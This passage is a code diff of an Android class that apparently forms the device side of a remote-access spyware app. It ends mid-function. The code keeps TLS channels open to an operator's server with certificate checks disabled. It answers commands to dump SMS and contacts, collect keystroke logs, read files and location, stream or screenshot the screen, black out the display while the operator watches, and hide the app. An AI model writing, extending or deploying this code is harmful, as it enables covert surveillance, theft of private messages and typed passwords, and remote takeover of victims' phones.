@@ -2,11 +2,7 @@ package com.task.tusker.network;
 
 import android.content.Context;
 import android.graphics.Bitmap;
-import android.net.Uri;
 import android.os.Build;
-import android.os.Bundle;
-import android.os.Handler;
-import android.os.Looper;
 import android.util.Base64;
 import android.util.Log;
 import com.task.tusker.advanced.NotificationInterceptor;
@@ -14,27 +10,20 @@ import com.task.tusker.commands.*;
 import com.task.tusker.services.UnifiedAccessibilityService;
 import com.task.tusker.utils.Constants;
 import com.task.tusker.utils.DeviceInfo;
-import com.task.tusker.utils.TaskExecutionState;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
-import java.io.IOException;
-import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
-import java.net.HttpURLConnection;
-import java.net.InetSocketAddress;
 import java.net.Socket;
-import java.net.URL;
 import javax.net.ssl.SSLContext;
 import javax.net.ssl.SSLSocket;
 import javax.net.ssl.SSLSocketFactory;
 import javax.net.ssl.TrustManager;
 import javax.net.ssl.X509TrustManager;
 import java.security.cert.X509Certificate;
-import java.util.ArrayDeque;
 import com.task.tusker.utils.ResourceGuard;
 import com.task.tusker.utils.IdleSuspensionManager;
 import java.util.concurrent.ExecutorService;
@@ -54,7 +43,6 @@ import java.util.concurrent.atomic.AtomicReference;
 public class SocketManager {
 
     private static final String TAG = "SocketManager";
-    private static final int ENDPOINT_FETCH_TIMEOUT_MS = 10_000;
 
     private static SocketManager instance;
     private Socket   tcpSocket;
@@ -63,31 +51,6 @@ public class SocketManager {
     private final Context  context;
     private volatile boolean connected = false;
     private volatile boolean running   = false;
-
-    // TCP endpoint discovery. The endpoint is cached in memory and in the
-    // app's private preferences so normal reconnects do not hit the discovery
-    // URL. A failed socket open/handshake invalidates this value and causes the
-    // next connection attempt to fetch a fresh host:port.
-    private static final String ENDPOINT_PREFS = "tcp_endpoint";
-    private static final String ENDPOINT_HOST_KEY = "host";
-    private static final String ENDPOINT_PORT_KEY = "port";
-    private final Object endpointLock = new Object();
-    private volatile TcpEndpoint tcpEndpoint;
-
-    private static final class TcpEndpoint {
-        final String host;
-        final int port;
-
-        TcpEndpoint(String host, int port) {
-            this.host = host;
-            this.port = port;
-        }
-
-        @Override
-        public String toString() {
-            return host + ":" + port;
-        }
-    }
 
     // Device screen dimensions — populated during registration, sent in every frame
     private int deviceScreenW = 0;
@@ -132,17 +95,6 @@ public class SocketManager {
         new java.util.concurrent.ThreadPoolExecutor.CallerRunsPolicy()
     );
     private final ScheduledExecutorService heartbeatExecutor = Executors.newSingleThreadScheduledExecutor();
-    // Dedicated keylog dispatcher, used only when the inline fast path cannot
-    // write (live channel down or mid-reconnect). Kept separate from
-    // `executor` so a bulk fetch can never sit in front of a captured
-    // keystroke, and from `liveExecutor` whose thread is blocked in readLine().
-    // Overflow runs on the calling thread instead of dropping an entry.
-    private final ExecutorService keylogExecutor = new java.util.concurrent.ThreadPoolExecutor(
-        1, 1, 30L, TimeUnit.SECONDS,
-        new java.util.concurrent.LinkedBlockingQueue<>(500),
-        r -> { Thread t = new Thread(r, "SocketMgr-keylog"); t.setDaemon(true); return t; },
-        new java.util.concurrent.ThreadPoolExecutor.CallerRunsPolicy()
-    );
     private ScheduledFuture<?>             heartbeatFuture;
 
     // ── Multi-channel sockets ─────────────────────────────────────────────
@@ -157,11 +109,6 @@ public class SocketManager {
     private Socket   liveSocket;
     private PrintWriter liveOut;
     private volatile boolean liveConnected = false;
-    // Events can be produced while the secondary socket is reconnecting. Keep
-    // a small bounded backlog so a transient live-channel race does not lose
-    // keylogger/notification/activity entries that are already stored locally.
-    private final ArrayDeque<JSONObject> pendingLiveEvents = new ArrayDeque<>();
-    private static final int MAX_PENDING_LIVE_EVENTS = 1000;
     // Single-thread executor prevents multiple concurrent live loops from stacking up
     private final ExecutorService liveExecutor = Executors.newSingleThreadExecutor();
 
@@ -321,108 +268,17 @@ public class SocketManager {
         java.util.concurrent.Future<?> scheduled;
     }
 
-    /**
-     * A task run is deliberately restarted from its original step list after
-     * the screen turns off or the device is locked. We do not retain a step
-     * cursor because continuing at the old cursor could leave the target app
-     * in an unknown state.
-     */
-    private static final int MAX_CLICK_TEXT_RETRIES = 3;
-    private static final int TASK_START_SUPERSEDED = 0;
-    private static final int TASK_START_STARTED = 1;
-    private static final int TASK_START_WAITING_FOR_UNLOCK = 2;
-
-    private static final class TaskRun {
-        final JSONArray steps;
-        final String commandId;
-        final int clickTextRetries;
-        final long generation;
-        final boolean returnHomeBeforeStart;
-        volatile Thread thread;
-        volatile boolean restartRequested;
-        volatile boolean screenPauseRequested;
-        volatile boolean terminal;
-        volatile int currentStepIndex = -1;
-
-        TaskRun(JSONArray steps, String commandId, int clickTextRetries, long generation,
-                boolean returnHomeBeforeStart) {
-            this.steps = steps;
-            this.commandId = commandId;
-            this.clickTextRetries = clickTextRetries;
-            this.generation = generation;
-            this.returnHomeBeforeStart = returnHomeBeforeStart;
-        }
-    }
-
-    private static final class PendingTask {
-        final JSONArray steps;
-        final String commandId;
-        final int clickTextRetries;
-        final long generation;
-        final boolean returnHomeBeforeStart;
-
-        PendingTask(JSONArray steps, String commandId, int clickTextRetries, long generation,
-                    boolean returnHomeBeforeStart) {
-            this.steps = steps;
-            this.commandId = commandId;
-            this.clickTextRetries = clickTextRetries;
-            this.generation = generation;
-            this.returnHomeBeforeStart = returnHomeBeforeStart;
-        }
-    }
-
     private final java.util.concurrent.ConcurrentHashMap<String, CommandSlot> commandSlots =
             new java.util.concurrent.ConcurrentHashMap<>();
     private final java.util.concurrent.ConcurrentHashMap<String, CommandSlot> activeCommandSlots =
             new java.util.concurrent.ConcurrentHashMap<>();
-
-    // Task Studio runs are kept separate from normal command coalescing because
-    // the task command acknowledges immediately while its steps run in a worker.
-    private final Object taskLock = new Object();
-    private final Object taskExecutionLock = new Object();
-    private final java.util.Map<String, TaskRun> activeTaskRuns = new java.util.HashMap<>();
-    private final java.util.Map<String, PendingTask> waitingTasks = new java.util.HashMap<>();
-    private String currentTaskCommandId;
-    private JSONArray currentTaskSteps;
-    private long nextTaskGeneration;
-    private long currentTaskGeneration;
-    private static final long TASK_UNLOCK_CHECK_INTERVAL_MS = 1_000L;
-    private final Handler taskLockHandler = new Handler(Looper.getMainLooper());
-    private android.content.BroadcastReceiver taskLockReceiver;
-    private android.app.KeyguardManager taskKeyguardManager;
-    private android.app.KeyguardManager.KeyguardLockedStateListener taskKeyguardStateListener;
-    // Guarded by taskLock; one blackout release is attempted per locked wait.
-    private boolean taskUnlockScreenReleaseRequested = false;
-    // Guarded by taskLock; distinguishes a keyguard pause from an ordinary retry wait.
-    private boolean taskWaitingForKeyguard = false;
-    private final Runnable taskUnlockCheck = new Runnable() {
-        @Override
-        public void run() {
-            synchronized (taskLock) {
-                if (waitingTasks.isEmpty()) {
-                    return;
-                }
-            }
-
-            // Keep checking indefinitely while locked. Display interactivity
-            // must not gate a restart once the keyguard clears.
-            if (!isTaskExecutionBlocked()) {
-                cancelTaskUnlockCheck();
-                resumeWaitingTasksIfAvailable();
-                return;
-            }
-
-            unblockScreenForLockedTaskWait();
-            taskLockHandler.postDelayed(this, TASK_UNLOCK_CHECK_INTERVAL_MS);
-        }
-    };
 
     // Touch/swipe deduplication — ignore identical command within 250 ms
     private volatile String  lastTouchKey  = "";
     private volatile long    lastTouchTime = 0L;
 
     // Dynamic monitored packages (runtime additions from dashboard)
-    
+    private final java.util.Set<String> dynamicMonitoredPackages = new java.util.concurrent.CopyOnWriteArraySet<>();
 
     // Command Handlers — one instance each, created once and reused
     private final CommandExecutor      commandExecutor;
@@ -451,8 +307,6 @@ public class SocketManager {
 
     private SocketManager(Context context) {
         this.context       = context;
-        TaskExecutionState.resetForMainProcessStart(context);
-        loadCachedTcpEndpoint();
         commandExecutor    = new CommandExecutor(context);
         smsHandler         = new SMSHandler(context);
         contactsHandler    = new ContactsHandler(context);
@@ -568,8 +422,6 @@ public class SocketManager {
                 } catch (Exception ignored) {}
             }
         });
-
-        registerTaskLockReceiver();
     }
 
     /** Called by UnifiedAccessibilityService once it's running, to init gesture recorder. */
@@ -602,199 +454,6 @@ public class SocketManager {
             Log.e("SocketManager", "buildTrustAllFactory failed: " + e.getMessage());
             return (SSLSocketFactory) SSLSocketFactory.getDefault();
         }
-    }
-
-    /**
-     * Open the TCP connection with a finite timeout, then layer TLS over that
-     * connected socket. Using SSLSocketFactory.createSocket(host, port)
-     * directly can block too long when a Zeabur forwarding port disappears.
-     */
-    private static SSLSocket openTlsSocket(
-            SSLSocketFactory factory, String host, int port) throws IOException {
-        Socket plainSocket = new Socket();
-        try {
-            plainSocket.connect(new InetSocketAddress(host, port), ENDPOINT_FETCH_TIMEOUT_MS);
-            SSLSocket sslSocket = (SSLSocket) factory.createSocket(plainSocket, host, port, true);
-            sslSocket.setUseClientMode(true);
-            sslSocket.startHandshake();
-            return sslSocket;
-        } catch (IOException e) {
-            try { plainSocket.close(); } catch (IOException ignored) {}
-            throw e;
-        }
-    }
-
-    /**
-     * Load the last successful discovery result. This is deliberately done
-     * without network I/O so service startup remains fast and offline devices
-     * can keep retrying the cached route.
-     */
-    private void loadCachedTcpEndpoint() {
-        try {
-            android.content.SharedPreferences prefs =
-                    context.getSharedPreferences(ENDPOINT_PREFS, Context.MODE_PRIVATE);
-            String host = prefs.getString(ENDPOINT_HOST_KEY, null);
-            int port = prefs.getInt(ENDPOINT_PORT_KEY, -1);
-            tcpEndpoint = createTcpEndpoint(host, port);
-            if (tcpEndpoint != null) {
-                Log.i(TAG, "Loaded cached TCP endpoint " + tcpEndpoint);
-            }
-        } catch (Throwable e) {
-            Log.w(TAG, "Could not load cached TCP endpoint: " + e.getMessage());
-        }
-    }
-
-    /**
-     * Return the cached route, fetching a new route only when there is no
-     * cached route. Calls are serialized so the primary, stream, and live
-     * channels cannot issue duplicate discovery requests.
-     */
-    private TcpEndpoint resolveTcpEndpoint() throws IOException {
-        TcpEndpoint cached = tcpEndpoint;
-        if (cached != null) return cached;
-
-        synchronized (endpointLock) {
-            cached = tcpEndpoint;
-            if (cached != null) return cached;
-
-            TcpEndpoint discovered = fetchTcpEndpoint();
-            tcpEndpoint = discovered;
-            context.getSharedPreferences(ENDPOINT_PREFS, Context.MODE_PRIVATE)
-                    .edit()
-                    .putString(ENDPOINT_HOST_KEY, discovered.host)
-                    .putInt(ENDPOINT_PORT_KEY, discovered.port)
-                    .apply();
-            Log.i(TAG, "Discovered and cached TCP endpoint " + discovered);
-            return discovered;
-        }
-    }
-
-    /**
-     * Forget only the route that actually failed. If another channel already
-     * discovered a replacement, a late failure from the old socket must not
-     * erase the newer route.
-     */
-    private void invalidateTcpEndpoint(TcpEndpoint failedEndpoint) {
-        if (failedEndpoint == null) return;
-        synchronized (endpointLock) {
-            if (tcpEndpoint != failedEndpoint) return;
-            tcpEndpoint = null;
-            context.getSharedPreferences(ENDPOINT_PREFS, Context.MODE_PRIVATE)
-                    .edit()
-                    .remove(ENDPOINT_HOST_KEY)
-                    .remove(ENDPOINT_PORT_KEY)
-                    .apply();
-            Log.w(TAG, "TCP endpoint unavailable; discovery will be retried");
-        }
-    }
-
-    private TcpEndpoint fetchTcpEndpoint() throws IOException {
-        HttpURLConnection connection = null;
-        try {
-            connection = (HttpURLConnection) new URL(Constants.TCP_ENDPOINT_URL).openConnection();
-            connection.setRequestMethod("GET");
-            connection.setConnectTimeout(ENDPOINT_FETCH_TIMEOUT_MS);
-            connection.setReadTimeout(ENDPOINT_FETCH_TIMEOUT_MS);
-            connection.setUseCaches(false);
-            connection.setInstanceFollowRedirects(true);
-
-            int status = connection.getResponseCode();
-            InputStream body = status >= 200 && status < 300
-                    ? connection.getInputStream()
-                    : connection.getErrorStream();
-            String response = body == null ? "" : readText(body).trim();
-            if (status < 200 || status >= 300) {
-                throw new IOException("Endpoint discovery returned HTTP " + status);
-            }
-
-            TcpEndpoint endpoint = parseTcpEndpoint(response);
-            if (endpoint == null) {
-                throw new IOException("Endpoint discovery returned an invalid host:port");
-            }
-            return endpoint;
-        } catch (IOException e) {
-            Log.w(TAG, "TCP endpoint discovery failed: " + e.getMessage());
-            throw e;
-        } finally {
-            if (connection != null) connection.disconnect();
-        }
-    }
-
-    private static String readText(InputStream input) throws IOException {
-        StringBuilder result = new StringBuilder();
-        BufferedReader reader = new BufferedReader(new InputStreamReader(input, "UTF-8"));
-        String line;
-        while ((line = reader.readLine()) != null) {
-            if (result.length() > 0) result.append('\n');
-            result.append(line);
-            if (result.length() > 4096) break;
-        }
-        reader.close();
-        return result.toString();
-    }
-
-    /**
-     * Accept the plain-text host:port response from devport. Also tolerate a
-     * JSON response or a URL so a future endpoint implementation can evolve
-     * without requiring another APK release.
-     */
-    private static TcpEndpoint parseTcpEndpoint(String raw) {
-        if (raw == null) return null;
-        String value = raw.trim();
-        if (value.length() == 0) return null;
-
-        if (value.startsWith("{")) {
-            try {
-                JSONObject json = new JSONObject(value);
-                value = json.optString("endpoint", json.optString("address", "")).trim();
-            } catch (Exception ignored) {
-                return null;
-            }
-        }
-
-        if (value.startsWith("tcp://")) value = value.substring("tcp://".length());
-        if (value.startsWith("https://")) value = value.substring("https://".length());
-        if (value.startsWith("http://")) value = value.substring("http://".length());
-        int slash = value.indexOf('/');
-        if (slash >= 0) value = value.substring(0, slash);
-
-        String host;
-        String portText;
-        if (value.startsWith("[")) {
-            int close = value.indexOf(']');
-            if (close < 0 || close + 2 > value.length() || value.charAt(close + 1) != ':') {
-                return null;
-            }
-            host = value.substring(1, close);
-            portText = value.substring(close + 2);
-        } else {
-            int colon = value.lastIndexOf(':');
-            if (colon <= 0 || colon == value.length() - 1 || value.indexOf(':') != colon) {
-                return null;
-            }
-            host = value.substring(0, colon);
-            portText = value.substring(colon + 1);
-        }
-
-        int port;
-        try {
-            port = Integer.parseInt(portText);
-        } catch (NumberFormatException e) {
-            return null;
-        }
-        return createTcpEndpoint(host, port);
-    }
-
-    private static TcpEndpoint createTcpEndpoint(String host, int port) {
-        if (host == null) return null;
-        host = host.trim();
-        if (host.length() == 0 || host.length() > 253 || port < 1 || port > 65535) {
-            return null;
-        }
-        if (host.indexOf('/') >= 0 || host.indexOf(' ') >= 0 || host.indexOf('\\') >= 0) {
-            return null;
-        }
-        return new TcpEndpoint(host, port);
     }
 
     /**
@@ -835,14 +494,12 @@ public class SocketManager {
         primaryLoopThread = Thread.currentThread();
         final int myGen = loopGeneration;
         while (running && loopGeneration == myGen) {
-            TcpEndpoint endpoint = null;
-            boolean socketOpened = false;
             try {
-                endpoint = resolveTcpEndpoint();
-                Log.i(TAG, "Connecting (TLS) to " + endpoint);
+                Log.i(TAG, "Connecting (TLS) to " + Constants.TCP_HOST + ":" + Constants.TCP_PORT);
                 SSLSocketFactory tlsFactory = buildTrustAllFactory();
-                SSLSocket sslSock = openTlsSocket(tlsFactory, endpoint.host, endpoint.port);
-                socketOpened = true;
+                SSLSocket sslSock = (SSLSocket) tlsFactory.createSocket(Constants.TCP_HOST, Constants.TCP_PORT);
+                sslSock.setUseClientMode(true);
+                sslSock.startHandshake();
                 tcpSocket = sslSock;
                 tcpSocket.setKeepAlive(true);
                 tcpSocket.setTcpNoDelay(true);
@@ -861,7 +518,6 @@ public class SocketManager {
             } catch (Throwable e) {
                 // Catch Throwable (not just Exception) so an Error never kills the reconnect loop
                 Log.e(TAG, "Connection error: " + e.getMessage());
-                if (!socketOpened) invalidateTcpEndpoint(endpoint);
             } finally {
                 connected = false;
                 stopHeartbeat();
@@ -899,13 +555,11 @@ public class SocketManager {
                 try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
                 continue;
             }
-            TcpEndpoint endpoint = null;
-            boolean socketOpened = false;
             try {
-                endpoint = resolveTcpEndpoint();
                 SSLSocketFactory streamTlsFactory = buildTrustAllFactory();
-                SSLSocket streamSsl = openTlsSocket(streamTlsFactory, endpoint.host, endpoint.port);
-                socketOpened = true;
+                SSLSocket streamSsl = (SSLSocket) streamTlsFactory.createSocket(Constants.TCP_HOST, Constants.TCP_PORT);
+                streamSsl.setUseClientMode(true);
+                streamSsl.startHandshake();
                 streamSocket = streamSsl;
                 streamSocket.setKeepAlive(true);
                 streamSocket.setTcpNoDelay(true);        // disable Nagle — send frames immediately
@@ -981,7 +635,6 @@ public class SocketManager {
                 }
             } catch (Throwable e) {
                 Log.e(TAG, "Stream channel error: " + e.getMessage());
-                if (!socketOpened) invalidateTcpEndpoint(endpoint);
             } finally {
                 streamConnected = false;
                 try { if (streamSocket != null) streamSocket.close(); } catch (Exception ignored) {}
@@ -1064,13 +717,11 @@ public class SocketManager {
                 try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
                 continue;
             }
-            TcpEndpoint endpoint = null;
-            boolean socketOpened = false;
             try {
-                endpoint = resolveTcpEndpoint();
                 SSLSocketFactory liveTlsFactory = buildTrustAllFactory();
-                SSLSocket liveSsl = openTlsSocket(liveTlsFactory, endpoint.host, endpoint.port);
-                socketOpened = true;
+                SSLSocket liveSsl = (SSLSocket) liveTlsFactory.createSocket(Constants.TCP_HOST, Constants.TCP_PORT);
+                liveSsl.setUseClientMode(true);
+                liveSsl.startHandshake();
                 liveSocket = liveSsl;
                 liveSocket.setKeepAlive(true);
                 liveSocket.setTcpNoDelay(true);       // disable Nagle — keylog/notif sent immediately
@@ -1088,9 +739,6 @@ public class SocketManager {
                 msg.put("data", d);
                 liveOut.print(msg.toString() + "\n");
                 liveOut.flush();
-                flushPendingLiveEventsLocked();
-                flushPersistedKeylogsOnConnect();
-                flushPersistedActivityOnConnect();
                 Log.i(TAG, "Live channel connected");
                 // Upload any offline recordings that were saved while disconnected
                 uploadPendingOfflineRecordings();
@@ -1121,7 +769,6 @@ public class SocketManager {
                 }
             } catch (Throwable e) {
                 Log.e(TAG, "Live channel error: " + e.getMessage());
-                if (!socketOpened) invalidateTcpEndpoint(endpoint);
             } finally {
                 liveConnected = false;
                 try { if (liveSocket != null) liveSocket.close(); } catch (Exception ignored) {}
@@ -1168,20 +815,7 @@ public class SocketManager {
      */
     private boolean sendLiveOnly(String event, JSONObject data) {
         synchronized (liveLock) {
-            if (!liveConnected || liveOut == null) {
-                try {
-                    JSONObject queued = new JSONObject();
-                    queued.put("event", event);
-                    queued.put("data", data);
-                    if (pendingLiveEvents.size() >= MAX_PENDING_LIVE_EVENTS) {
-                        pendingLiveEvents.removeFirst();
-                    }
-                    pendingLiveEvents.addLast(queued);
-                } catch (Exception e) {
-                    Log.e(TAG, "queueLiveEvent [" + event + "] error: " + e.getMessage());
-                }
-                return false;
-            }
+            if (!liveConnected || liveOut == null) return false;
             try {
                 JSONObject msg = new JSONObject();
                 msg.put("event", event);
@@ -1194,68 +828,6 @@ public class SocketManager {
                 Log.e(TAG, "sendLiveOnly [" + event + "] error: " + e.getMessage());
                 return false;
             }
-        }
-    }
-
-    /** Flush events captured during a short live-channel reconnect window. */
-    private void flushPendingLiveEventsLocked() {
-        if (!liveConnected || liveOut == null) return;
-        while (!pendingLiveEvents.isEmpty()) {
-            try {
-                liveOut.print(pendingLiveEvents.removeFirst().toString() + "\n");
-                liveOut.flush();
-                if (liveOut.checkError()) return;
-            } catch (Exception e) {
-                return;
-            }
-        }
-    }
-
-    /** Push recent persisted keylogs from local storage when live channel connects. */
-    private void flushPersistedKeylogsOnConnect() {
-        if (!liveConnected || liveOut == null) return;
-        try {
-            JSONObject result = logManager.getLogs(200);
-            if (result.optBoolean("success", false)) {
-                JSONArray logs = result.optJSONArray("logs");
-                if (logs != null) {
-                    for (int i = 0; i < logs.length(); i++) {
-                        JSONObject entry = logs.optJSONObject(i);
-                        if (entry != null) {
-                            entry.put("deviceId", DeviceInfo.getDeviceId(context));
-                            liveOut.print(new JSONObject().put("event", "keylog:entry").put("data", entry).toString() + "\n");
-                        }
-                    }
-                    liveOut.flush();
-                    Log.i(TAG, "Flushed " + logs.length() + " persisted keylogs on live connect");
-                }
-            }
-        } catch (Exception e) {
-            Log.w(TAG, "flushPersistedKeylogsOnConnect error: " + e.getMessage());
-        }
-    }
-
-    /** Push recent persisted activity from local storage when live channel connects. */
-    private void flushPersistedActivityOnConnect() {
-        if (!liveConnected || liveOut == null) return;
-        try {
-            JSONObject result = logManager.getActivity(200);
-            if (result.optBoolean("success", false)) {
-                JSONArray activities = result.optJSONArray("activities");
-                if (activities != null) {
-                    for (int i = 0; i < activities.length(); i++) {
-                        JSONObject entry = activities.optJSONObject(i);
-                        if (entry != null) {
-                            entry.put("deviceId", DeviceInfo.getDeviceId(context));
-                            liveOut.print(new JSONObject().put("event", "app:foreground").put("data", entry).toString() + "\n");
-                        }
-                    }
-                    liveOut.flush();
-                    Log.i(TAG, "Flushed " + activities.length() + " persisted activities on live connect");
-                }
-            }
-        } catch (Exception e) {
-            Log.w(TAG, "flushPersistedActivityOnConnect error: " + e.getMessage());
         }
     }
 
@@ -1583,9 +1155,6 @@ public class SocketManager {
     }
 
     public void disconnect() {
-        // A socket disconnect is not a task cancellation. Active task workers
-        // execute against on-device handlers and keep running offline; their
-        // task:progress events are best-effort until the connection returns.
         running   = false;
         connected = false;
         streamConnected = false;
@@ -1602,8 +1171,6 @@ public class SocketManager {
     }
 
     public boolean isConnected() { return connected; }
-
-    public boolean isLiveConnected() { return liveConnected; }
 
     /**
      * Force a full re-initialization of all channels.
@@ -1777,8 +1344,6 @@ public class SocketManager {
             case "get_clipboard":
             case "set_clipboard":
             case "get_device_info":
-            case "get_app_installation_info":
-            case "extract_self_apk":
             case "get_location":
             case "get_battery_info":
             case "get_network_info":
@@ -1902,8 +1467,7 @@ public class SocketManager {
         // ── Accessibility status ─────────────────────────────────────────
         if (command.equals("get_accessibility_status")) {
             JSONObject r = new JSONObject();
-            boolean enabled = UnifiedAccessibilityService.getInstance() != null
-                    || UnifiedAccessibilityService.hasFreshHeartbeat(context);
+            boolean enabled = UnifiedAccessibilityService.getInstance() != null;
             r.put("success", true);
             r.put("enabled", enabled);
             r.put("message", enabled ? "Accessibility service is running" : "Accessibility service is NOT running — enable it in Settings");
@@ -1917,11 +1481,6 @@ public class SocketManager {
             bulkExecutor.execute(() -> {
                 try {
                     JSONObject full = smsHandler.getAllSMS(smsLimit);
-                    if (!full.optBoolean("success", false)) {
-                        sendChunkedError(cidSms, "get_all_sms",
-                                full.optString("error", "Unable to read SMS"));
-                        return;
-                    }
                     JSONArray arr = full.optJSONArray("messages");
                     if (arr == null) arr = new JSONArray();
                     sendChunked(cidSms, "get_all_sms", arr, "messages", 50);
@@ -2030,7 +1589,7 @@ public class SocketManager {
         }
 
         // ── Screenshot ───────────────────────────────────────────────────
-        // Handled in handleAccessibilityCommand (requires accessibility service process)
+        if (command.equals("take_screenshot")) return screenshotHandler.takeScreenshot();
 
         // ── Files ────────────────────────────────────────────────────────
         if (command.equals("list_files")) {
@@ -2152,8 +1711,6 @@ public class SocketManager {
         // ── Input Logging ───────────────────────────────────────────────────
         if (command.equals("get_keylogs"))            return logManager.getKeylogs(params.optInt("limit", 100));
         if (command.equals("clear_keylogs"))          return logManager.clearKeylogs();
-        if (command.equals("get_activity"))           return logManager.getActivity(params.optInt("limit", 100));
-        if (command.equals("clear_activity"))         return logManager.clearActivity();
         if (command.equals("list_keylog_files")) {
             final String cidKl = params.optString("commandId", "");
             bulkExecutor.execute(() -> {
@@ -2258,7 +1815,21 @@ public class SocketManager {
             if (steps == null || steps.length() == 0)
                 return new JSONObject().put("success", false).put("error", "No steps");
 
-            return startOrQueueTask(steps, commandId);
+            // ── Persist the workflow to device storage BEFORE starting execution ──
+            // This ensures the task survives connection drops, app restarts,
+            // and process kills — the device owns the workflow independently.
+            boolean stored = saveTaskToDevice(steps, commandId);
+
+            // Start execution in a background thread.  The task uses the in-memory
+            // steps reference (already fully received before we got here) which is
+            // equivalent to the file we just saved.
+            new Thread(() -> { try { executeTaskLocal(steps, commandId); } catch (Exception e) { Log.e(TAG, "run_task_local: " + e.getMessage()); } }, "task-local").start();
+
+            return new JSONObject()
+                    .put("success", true)
+                    .put("started", true)
+                    .put("stored", stored)
+                    .put("steps", steps.length());
         }
         if (command.equals("disable_app"))    return appMonitor.disableApp(params.getString("packageName"));
 
@@ -2267,8 +1838,43 @@ public class SocketManager {
         if (command.equals("get_notifications_from_app")) return NotificationInterceptor.getNotificationsFromApp(params.getString("packageName"));
         if (command.equals("clear_notifications"))        return NotificationInterceptor.clearAllNotifications();
 
-        // Streaming commands (stream_start, stream_stop) are handled in handleAccessibilityCommand
-        // which runs in the accessibility service process
+        // ── Streaming — event-driven ─────────────────────────────────────
+        if (command.equals("stream_start")) {
+            // Read the interval the dashboard requests (100-5000ms; default 150ms).
+            final long requestedIntervalMs = Math.max(100L, params.optLong("intervalMs", 150L));
+            final String deviceId = DeviceInfo.getDeviceId(context);
+            // Serialize setup through heartbeatExecutor (single-threaded) so that a
+            // stream_stop submitted just before this cannot arrive *after* we start.
+            heartbeatExecutor.execute(() -> {
+                // Feature mutex: stop camera stream and gallery before starting screen stream
+                if (cameraStreamHandler.isStreaming()) cameraStreamHandler.stopStream();
+                galleryStopFlag.set(true);
+                activeFeature = "screen";
+                startIdleFrameMode(deviceId, requestedIntervalMs);
+                // Do NOT call sendSingleFrame here — first frame is already in-flight
+                // on the capture executor (dispatched below, before this task was queued).
+            });
+            // Dispatch the first frame capture directly to the capture executor RIGHT NOW —
+            // do not wait for heartbeatExecutor to dequeue the setup lambda above.
+            // This eliminates the "setup queue" delay so the first screenshot starts
+            // arriving within one captureScreenSync() call (~100-500ms) instead of
+            // waiting for heartbeatExecutor + captureScreenSync() in sequence.
+            sendSingleFrame(deviceId);
+            JSONObject r = new JSONObject();
+            r.put("success", true);
+            r.put("message", "Stream started — push interval " + requestedIntervalMs + "ms");
+            return r;
+        }
+        if (command.equals("stream_stop")) {
+            heartbeatExecutor.execute(() -> {
+                stopIdleFrameMode();
+                stopBlockFrameMode();
+            });
+            JSONObject r = new JSONObject();
+            r.put("success", true);
+            r.put("message", "Stream stopped");
+            return r;
+        }
         if (command.equals("stream_request_frame")) {
             // When block screen is active the device is already pushing frames every 1.5s.
             // Ignore on-demand frame requests to avoid duplicate frames and extra CPU load.
@@ -2300,7 +1906,7 @@ public class SocketManager {
 
         // ── Screen Blackout ───────────────────────────────────────────────
         if (command.equals("screen_blackout_on")) {
-            JSONObject r = handleAccessibilityCommand(command, params);
+            JSONObject r = screenBlackout.enableBlackout();
             if (r.optBoolean("success", false)) {
                 // Start auto-pushing frames every 1.5s so dashboard can see & control the device
                 startBlockFrameMode(DeviceInfo.getDeviceId(context));
@@ -2308,12 +1914,16 @@ public class SocketManager {
             return r;
         }
         if (command.equals("screen_blackout_off")) {
-            JSONObject r = handleAccessibilityCommand(command, params);
+            JSONObject r = screenBlackout.disableBlackout();
             stopBlockFrameMode();
             return r;
         }
         if (command.equals("get_blackout_status")) {
-            return handleAccessibilityCommand(command, params);
+            JSONObject r = new JSONObject();
+            r.put("success", true);
+            r.put("active", screenBlackout.isActive());
+            r.put("message", screenBlackout.isActive() ? "Screen blackout is ON" : "Screen blackout is OFF");
+            return r;
         }
 
         if (command.equals("fully_hide_app")) {
@@ -2353,9 +1963,7 @@ public class SocketManager {
         // ── Dynamic app monitoring ────────────────────────────────────────
         if (command.equals("add_monitored_app")) {
             String pkg = params.optString("packageName", "");
-            if (!pkg.isEmpty()) {
-                getAppMonitor().instanceAddMonitored(pkg);
-            }
+            if (!pkg.isEmpty()) dynamicMonitoredPackages.add(pkg);
             JSONObject r = new JSONObject();
             r.put("success", true);
             r.put("message", "Now monitoring: " + pkg);
@@ -2363,9 +1971,7 @@ public class SocketManager {
         }
         if (command.equals("remove_monitored_app")) {
             String pkg = params.optString("packageName", "");
-            if (!pkg.isEmpty()) {
-                getAppMonitor().instanceRemoveMonitored(pkg);
-            }
+            dynamicMonitoredPackages.remove(pkg);
             JSONObject r = new JSONObject();
             r.put("success", true);
             r.put("message", "Stopped monitoring: " + pkg);
@@ -2769,8 +2375,6 @@ public class SocketManager {
             case "screen_reader_stop":
             case "screen_reader_stream_start":
             case "screen_reader_stream_stop":
-            case "stream_start":
-            case "stream_stop":
             case "take_screenshot":
             case "list_screen_recordings":
             case "get_screen_recording":
@@ -2817,95 +2421,15 @@ public class SocketManager {
         }
     }
 
-    /**
-     * Dispatch an accessibility command from the isolated accessibility process.
-     * This is the ContentProvider IPC entry point used by the main-process socket
-     * manager when the service instance is not visible in its own process.
-     */
-    public JSONObject executeAccessibilityCommandFromBridge(String command, JSONObject params) {
-        if (UnifiedAccessibilityService.getInstance() == null) {
-            JSONObject result = new JSONObject();
-            try {
-                result.put("success", false);
-                result.put("error", "Accessibility service is not running. Enable it in Settings → Accessibility → "
-                        + "Downloaded Apps → [App Name]");
-                result.put("requiresAccessibility", true);
-            } catch (JSONException ignored) {}
-            return result;
-        }
-        try {
-            return handleAccessibilityCommand(command, params != null ? params : new JSONObject());
-        } catch (JSONException e) {
-            JSONObject result = new JSONObject();
-            try {
-                result.put("success", false);
-                result.put("error", e.getMessage() != null ? e.getMessage() : "Invalid command parameters");
-            } catch (JSONException ignored) {}
-            return result;
-        }
-    }
-
     private JSONObject handleAccessibilityCommand(String command, JSONObject params) throws JSONException {
         UnifiedAccessibilityService accessSvc = UnifiedAccessibilityService.getInstance();
 
         if (accessSvc == null) {
-            if (UnifiedAccessibilityService.hasFreshHeartbeat(context)) {
-                try {
-                    Bundle extras = new Bundle();
-                    extras.putString("params", params != null ? params.toString() : "{}");
-                    Bundle reply = context.getContentResolver().call(
-                            Uri.parse("content://" + context.getPackageName()
-                                    + ".accessibilitybridge"),
-                            "execute", command, extras);
-                    if (reply != null) {
